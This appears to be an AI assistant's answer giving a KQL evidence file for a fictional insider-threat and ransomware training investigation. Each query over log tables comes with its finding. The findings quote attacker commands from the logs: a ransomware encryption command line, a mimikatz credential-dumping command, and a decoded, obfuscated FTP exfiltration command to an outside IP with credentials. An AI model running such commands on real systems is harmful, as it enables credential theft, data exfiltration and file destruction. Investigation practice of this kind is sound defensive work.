Here’s the **complete, fully finished KQL evidence file**, with **Section 8.8 fully completed** and everything else intact.

You can drop this straight into:

`investigations/encryptodera-insider-ransomware/encryptodera-insider-ransomware-kql.md`

---

# Encryptodera Insider Threat & Ransomware – KQL Evidence File

Below is the complete, organized KQL evidence used throughout the investigation.  
Each section includes:

- A short explanation  
- The KQL query  
- A clean **Finding**  

---

# 1. Employee Baseline & Environment Overview

### 1.1 Sample of Employee Table
```kql
Employees
| take 10
```
**Finding:** Verified table structure and fields.

### 1.2 Total Number of Employees
```kql
Employees
| count
```
**Finding:** Encryptodera has **600 employees**.

### 1.3 Identify Employee by IP
```kql
Employees
| where ip_addr == "10.10.0.216"
```
**Finding:** IP belongs to **Nakia Acosta**.

### 1.4 Emails Received by Nakia
```kql
Email
| where recipient == "nakia_acosta@encryptoderafinancial.com"
| count
```
**Finding:** Nakia received **38 emails**.

### 1.5 Distinct Senders from bitbingersbanking.net
```kql
Email
| where sender has "bitbingersbanking.net"
| distinct sender
| count
```
**Finding:** **1204** distinct senders.

---

# 2. Employee Activity Analysis

## 2.1 Timothy Geffre

### Employee Record
```kql
Employees
| where name == "Timothy Geffre"
```
**Finding:** IP = **10.10.1.73**, Email = **timothy_geffre@encryptoderafinancial.com**.

### Distinct Websites Visited
```kql
OutboundNetworkEvents
| where src_ip == "10.10.1.73"
| distinct url
| count
```
**Finding:** Timothy visited **92 unique websites**.

---

## 2.2 Passive DNS Review

### Sample of Passive DNS
```kql
PassiveDns
| take 10
```
**Finding:** Table structure validated.

### Domains Containing “money”
```kql
PassiveDns
| where domain contains "money"
| distinct domain
| count
```
**Finding:** **15** domains contain “money”.

### moneyppl.com Resolution
```kql
PassiveDns
| where domain contains "moneyppl.com"
```
**Finding:** Domain resolves to **211.152.115.93**.

---

## 2.3 Employees Named Karen

### Identify All Karens
```kql
Employees
| where name contains "Karen"
```
**Finding:** **3 employees** named Karen.

### URLs Browsed by Karens
```kql
let karen_ips = 
Employees
| where name has "Karen"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (karen_ips)
| distinct url
| count
```
**Finding:** **321 unique URLs**.

### Authentication Attempts for Karens
```kql
let karen_users = Employees
| where name has "Karen"
| distinct username;
AuthenticationEvents
| where username in (karen_users)
| count
```
**Finding:** **420 authentication attempts**.

---

# 3. Barry Shmelly Investigation

## 3.1 Employee Record
```kql
Employees
| where name == "Barry Shmelly"
```
**Finding:** Role = **StackOverflow Copy Paster**, IP = **10.10.0.1**.

---

## 3.2 January 16 Email
```kql
Email
| where timestamp between (datetime(2024-01-16T00:00:00Z) .. datetime(2024-01-16T23:59:59Z))
| where sender == "barry_shmelly@encryptoderafinancial.com"
| order by timestamp asc
```
**Finding:** Subject:  
*“I'm not coming in today. I'm sick of this place. We're all getting laid off anyway.”*

### Role of Recipients
```kql
let emp_emails = 
Email
| where timestamp between (datetime(2024-01-16T00:00:00Z) .. datetime(2024-01-16T23:59:59Z))
| where sender == "barry_shmelly@encryptoderafinancial.com"
| distinct recipient;
Employees
| where email_addr in (emp_emails)
| distinct role
```
**Finding:** All recipients were **Social Media Managers**.

---

## 3.3 Hostile Email to CEO
```kql
let role_email = 
Email
| where sender == "barry_shmelly@encryptoderafinancial.com"
| where subject contains "YOU ARE A GREEDY PIG!!!! WHAT IS WRONG WITH YOU?????"
| project recipient;
Employees
| where email_addr in (role_email)
```
**Finding:** Recipient: **Les Goh**, CEO.

---

## 3.4 Barry’s Browsing & File Access

### Cybersecurity Insiders Article
```kql
OutboundNetworkEvents
| where src_ip == "10.10.0.1"
| where timestamp between (datetime(2023-12-26T12:00:00Z) .. datetime(2023-12-26T14:15:00Z))
```
**Finding:** Accessed secure file transfer article.

### January 15 Browsing
```kql
OutboundNetworkEvents
| where src_ip == "10.10.0.1"
| where timestamp between (datetime(2024-01-15T00:00:00Z) .. datetime(2024-01-15T23:59:59Z))
```
**Findings:**  
- First URL: **7‑Zip download**  
- USB article: **wikihow.com/Use-a-USB-Flash-Drive**

### Secret Document Download
```kql
InboundNetworkEvents
| where src_ip == "10.10.0.1"
| where url contains "secret"
```
**Finding:** Downloaded **SECRET_MergersAndAcquisitions_Strategy2025.docx**.

### Salary Document
```kql
InboundNetworkEvents
| where src_ip == "10.10.0.1"
| where url contains "docx"
```
**Finding:** Downloaded **ExecutiveSalaryNegotiations.docx**.

### Algorithm ZIP
```kql
InboundNetworkEvents
| where src_ip == "10.10.0.1"
| where url contains "zip"
```
**Finding:** Downloaded **Encryptodera_Proprietary_Algorithms.zip**.

### Zip Password
```kql
ProcessEvents
| where hostname == "IGOY-DESKTOP"
| where username == "bashmelly"
| where process_commandline contains "secret"
```
**Finding:** Password used: **securePass123**.

### Flash Drive
```kql
ProcessEvents
| where process_commandline contains "zip"
```
**Finding:** Stored files on **E:\SchmellyDrive**.

---

# 4. Ransomware Deployment

## 4.1 Ransom Note Creation
```kql
FileCreationEvents
| where filename contains "YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt"
| order by timestamp asc
``]
**Findings:**  
- First seen: **2024‑02‑17T02:34:54Z**  
- First host: **UL8R-MACHINE**  
- Total hosts: **306**

---

## 4.2 Encryption Details

### Encrypted File Extension
```kql
ProcessEvents
| where hostname == "UL8R-MACHINE"
| where process_commandline contains "encrypt"
```
**Finding:** Extension used: **.umadbro**.

### Count Encrypted Files
```kql
FileCreationEvents
| where hostname == "UL8R-MACHINE"
| where filename contains "umadbro"
```
**Finding:** **50 files** encrypted.

### Ransomware Command
```kql
ProcessEvents
| where hostname == "UL8R-MACHINE"
| where process_commandline has "umadbro"
```
**Finding:**  
`start /b C:\ProgramData\files_go_byebye.exe -encrypt -target C:\Users\ -ext .umadbro`

---

## 4.3 Payload Delivery

### files_go_byebye.exe Creation
```kql
FileCreationEvents
| where filename contains "files_go_byebye.exe"
| where hostname == "UL8R-MACHINE"
```
**Finding:** Appeared at **2024‑02‑17T02:30:50Z**.

### Commands Around Attack
```kql
ProcessEvents
| where hostname == "UL8R-MACHINE"
| where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
```
**Finding:** **23 commands** executed.

### Encoded PowerShell
```kql
ProcessEvents
| where hostname == "UL8R-MACHINE"
| where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
| where process_commandline contains "enc"
```
**Finding:** Downloaded payload from **notification-finance-services.com**.

### gpupdate /force
```kql
ProcessEvents
| where process_commandline contains "gpupdate /force"
| distinct hostname
| count
```
**Finding:** Ran on **306 devices**.

---

# 5. Discovery & Lateral Movement

## 5.1 systeminfo Usage
```kql
ProcessEvents
| where process_commandline contains "systeminfo"
| count
```
**Finding:** Run on **8 machines**.

### First systeminfo Timestamp
```kql
ProcessEvents
| where process_commandline contains "systeminfo"
| summarize first_time = min(timestamp)
```
**Finding:** **2024‑02‑02T03:32:36Z**

---

## 5.2 Ransomware Start Time
```kql
FileCreationEvents
| where hostname == "UL8R-MACHINE"
| where filename endswith ".umadbro"
| summarize attack_start = min(timestamp)
```
**Finding:** **2024‑02‑17T02:32:57Z**

### Days Between Discovery & Attack
```kql
let first_discovery =
toscalar(
    ProcessEvents
    | where process_commandline contains "systeminfo"
    | summarize min(timestamp)
);
FileCreationEvents
| where hostname == "UL8R-MACHINE"
| where filename endswith ".umadbro"
| summarize first_encryption = min(timestamp)
| extend days_elapsed = datetime_diff("day", first_encryption, first_discovery)
| project days_elapsed
```
**Finding:** **15 days** dwell time.

---

## 5.3 First Compromised Host
```kql
ProcessEvents
| where process_commandline has "systeminfo"
| summarize first_seen = min(timestamp) by hostname
| top 1 by first_seen asc
```
**Finding:** **41QI-LAPTOP**.

---

## 5.4 Domain Controller Discovery
```kql
ProcessEvents
| where process_commandline contains "nltest /dclist"
```
**Finding:** Used to locate domain controller.

---

# 6. Credential Theft

## 6.1 Domain Admin Login
```kql
AuthenticationEvents
| where username == "lihenry_domain_admin"
```
**Finding:** Logged into **GJ95-LAPTOP** from **10.10.0.4**.

---

## 6.2 Mimikatz Execution
```kql
ProcessEvents
| where hostname == "GJ95-LAPTOP"
| where process_commandline contains "mimikatz"
```
**Finding:**  
`totally_not_mimikatz.exe "sekurlsa::logonpasswords"`

---

## 6.3 Owner of GJ95-LAPTOP
```kql
Employees
| where hostname == "GJ95-LAPTOP"
```
**Finding:** **Valerie Orozco**, System Administrator.

---

# 7. Phishing Campaign

## 7.1 Valerie Targeted
```kql
Email
| where sender == "barry_shmelly@encryptoderafinancial.com"
| where recipient == "valerie_orozco@encryptoderafinancial.com"
```
**Finding:** Malicious file sent:  
**Employee_Contact_List_Updated_March_2024.docx.exe**

---

## 7.2 Did Valerie Click?
```kql
let maliciousLinks =
Email
| where sender == "barry_shmelly@encryptoderafinancial.com"
| where recipient == "valerie_orozco@encryptoderafinancial.com"
| project link;

OutboundNetworkEvents
| where url has_any (maliciousLinks)
| where src_ip == "10.10.0.18"
| order by timestamp asc
```
**Finding:** Valerie **did not** click the link.

---

## 7.3 Accounts Logging Into Valerie’s Machine
```kql
AuthenticationEvents
| where hostname == "GJ95-LAPTOP"
| where result contains "successful"
| distinct username
```
**Finding:**  
- vaorozco  
- systadmi_local_admin  
- lihenry_domain_admin  

---

## 7.4 Host Spread of These Accounts
```kql
let attempt_users = 
AuthenticationEvents
| where hostname == "GJ95-LAPTOP"
| where result contains "successful"
| distinct username; 

AuthenticationEvents
| where username in (attempt_users)
| summarize dcount(hostname) by username
| order by dcount_hostname
```
**Finding:**  
- vaorozco → 2 hosts  
- systadmi_local_admin → 10 hosts  
- lihenry_domain_admin → 2 hosts  

---

## 7.5 Misuse of Local Admin
```kql
let hosts = FileCreationEvents
| where filename has "screenconnect"
| distinct hostname;

AuthenticationEvents
| where hostname in (hosts)
| where username has "systadmi"
| where result has "Successful"
| join (
    Employees 
    | project ip_addr,role,email_addr,name
) on $left.src_ip==$right.ip_addr
| project SourceIpName=name, SourceIpUserRole=role, hostname, username, timestamp
```
**Finding:** Misused by **Robin Kirby** (non‑IT).

---

## 7.6 Robin Phished
```kql
Email
| where sender == "barry_shmelly@encryptoderafinancial.com"
| where recipient == "robin_kirby@encryptoderafinancial.com"
```
**Finding:** Phished at **2024‑02‑01T03:59:30Z**.

---

# 8. Data Exfiltration (Jane Smith)

## 8.1 Identify Exfil IP
```kql
NetworkFlow
| where timestamp between (datetime(2024-02-05) .. datetime(2024-02-05 23:59:59))
| summarize sum(bytes) by dest_ip
| order by sum_bytes desc
```
**Finding:** **182.56.23.121** received the most data.

---

## 8.2 Days Data Sent
```kql
NetworkFlow
| where dest_ip == "182.56.23.121"
| summarize days = dcount(format_datetime(timestamp, "yyyy-MM-dd"))
```
**Finding:** Data sent on **27 days**.

---

## 8.3 Total Bytes
```kql
NetworkFlow
| where dest_ip == "182.56.23.121"
| summarize sum(bytes) by dest_ip
```
**Finding:** **208,138 bytes** transferred.

---

## 8.4 Identify Sender
```kql
let sender_ips = 
NetworkFlow
| where dest_ip  == "182.56.23.121"
| distinct src_ip; 
Employees
| where ip_addr in (sender_ips)
```
**Finding:** **Jane Smith**, Cryto Bruh (Blockchain Contractor).

---

## 8.5 Jane’s Reconnaissance
```kql
InboundNetworkEvents
| where src_ip == "10.10.0.2"
| where url contains "search"
```
**Finding:** Searched for **cold storage crypto wallets**.

---

## 8.6 Jane’s Emails
```kql
Email
| where sender == "jane_smith@encryptoderafinancial.com" or recipient == "jane_smith@encryptoderafinancial.com"
| extend other = iff(sender == "jane_smith@encryptoderafinancial.com", recipient, sender)
| project timestamp, sender, recipient, other, subject, link
```
**Finding:** Communicated with **elboss@westealurcrypto.com**; received FTP server IP **182.56.23.121**.

---

## 8.7 Tools Downloaded
```kql
FileCreationEvents
| where hostname == "GOTI-LAPTOP"
| where username == "jasmith"
| where path contains "downloads"
```
**Findings:**  
- **ftp_client.exe** (data exfil tool)  
- **crypto_stealer.exe** (crypto theft tool)

---

## 8.8 Jane’s Data Exfiltration Command (Base64 → Decoded)

### KQL Query
```kql
ProcessEvents
| where hostname == "GOTI-LAPTOP"
| where process_name contains "cmd.exe"
```

### Base64‑Encoded Command (as found)
```text
KCAnXFxub29NZWhUb1RcXGh0aW1zYWpcXHNyZXNVXFw6QyBodGFwLS0gMTIxLjMyLjY1LjI4MSBwaS0tIDEyIHRyb3AtLSAibW9jLmxhaWNuYW5pZmFyZWRvdHB5cmNuZSIgbWl0Y2l2LS0gNURONEhydUZGMHRpM2s0dGxsM3dPVFlSQ2hjdW0ydG9nVSBzc2FwLS0gaHRpbXNhaiByZXN1LS0geWxpYWQtLSBleGUudG5laWxjX3B0ZicgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn
```

### Decoded Command
```text
ftp_client.exe --daily --user jasmith --pass Ugot2muchCRYTOw3llt4k3it0FFurH4ND5 --victim "encryptoderafinancial.com" --port 21 --ip 182.56.23.121 --path C:\Users\jasmith\ToTheMoon\
```

### Findings
- **Exfiltration Path:** `C:\Users\jasmith\ToTheMoon\`  
- **Tempo (Frequency):** `daily`  
- **Password Used:** `Ugot2muchCRYTOw3llt4k3it0FFurH4ND5`  
- **Tool Used:** `ftp_client.exe`  
- **Victim Domain:** `encryptoderafinancial.com`  
- **Server IP:** `182.56.23.121`  
- **Port / Protocol:** `21` (FTP)

---

If you want, next step we can:

- Build the folder structure for this case  
- Add a short index in your main README pointing to this investigation.